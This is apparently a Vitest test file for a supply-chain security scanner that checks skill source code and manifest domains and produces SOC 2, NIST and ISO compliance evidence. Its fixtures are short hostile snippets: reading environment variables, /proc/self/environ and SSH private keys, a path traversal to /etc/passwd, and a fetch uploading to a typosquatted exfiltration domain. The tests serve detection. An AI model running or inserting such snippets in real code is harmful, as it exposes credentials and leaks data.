import { describe, it, expect } from 'vitest';
import {
  scanSkillSource,
  auditManifestDomains,
  generateSupplyChainEvidence,
} from './supply-chain-security.js';

describe('scanSkillSource', () => {
  it('detects process.env scanning', () => {
    const source = 'const secrets = Object.keys(process.env);';
    const risks = scanSkillSource(source);
    expect(risks.some((r) => r.category === 'env_scanning')).toBe(true);
  });

  it('allows SKILL_ prefixed env access', () => {
    const source = 'const dir = process.env["SKILL_DIR"];';
    const risks = scanSkillSource(source);
    expect(risks.some((r) => r.category === 'env_scanning')).toBe(false);
  });

  it('detects /proc/self/environ access', () => {
    const source = 'fs.readFileSync("/proc/self/environ")';
    const risks = scanSkillSource(source);
    expect(risks.some((r) => r.category === 'credential_access')).toBe(true);
  });

  it('detects .ssh access', () => {
    const source = 'fs.readFileSync(homedir + "/.ssh/id_rsa")';
    const risks = scanSkillSource(source);
    expect(risks.some((r) => r.category === 'credential_access')).toBe(true);
  });

  it('detects path traversal', () => {
    const source = 'require("../../../../../../etc/passwd")';
    const risks = scanSkillSource(source);
    expect(risks.some((r) => r.category === 'path_traversal')).toBe(true);
  });

  it('detects known exfiltration domains', () => {
    const source = 'fetch("https://scan.aquasecurtiy.org/upload")';
    const risks = scanSkillSource(source);
    expect(risks.some((r) => r.category === 'exfiltration_domain')).toBe(true);
    expect(risks.find((r) => r.category === 'exfiltration_domain')?.severity).toBe('critical');
  });

  it('returns empty for clean source', () => {
    const source = 'export function hello() { return "world"; }';
    const risks = scanSkillSource(source);
    expect(risks).toEqual([]);
  });
});

describe('auditManifestDomains', () => {
  it('flags known exfiltration domains', () => {
    const risks = auditManifestDomains([
      'api.github.com',
      'scan.aquasecurtiy.org',
    ]);
    expect(risks).toHaveLength(1);
    expect(risks[0].severity).toBe('critical');
  });

  it('passes clean domains', () => {
    const risks = auditManifestDomains([
      'api.github.com',
      'hooks.slack.com',
    ]);
    expect(risks).toEqual([]);
  });
});

describe('generateSupplyChainEvidence', () => {
  it('returns compliance controls', () => {
    const { controls } = generateSupplyChainEvidence();
    expect(controls.length).toBeGreaterThanOrEqual(4);
  });

  it('covers SOC 2, NIST, and ISO frameworks', () => {
    const { controls } = generateSupplyChainEvidence();
    const frameworks = controls.map((c) => c.framework);
    expect(frameworks).toContain('SOC 2');
    expect(frameworks).toContain('NIST CSF');
    expect(frameworks).toContain('ISO 27001');
  });

  it('all controls have evidence', () => {
    const { controls } = generateSupplyChainEvidence();
    for (const control of controls) {
      expect(control.evidence.length).toBeGreaterThan(0);
    }
  });
});
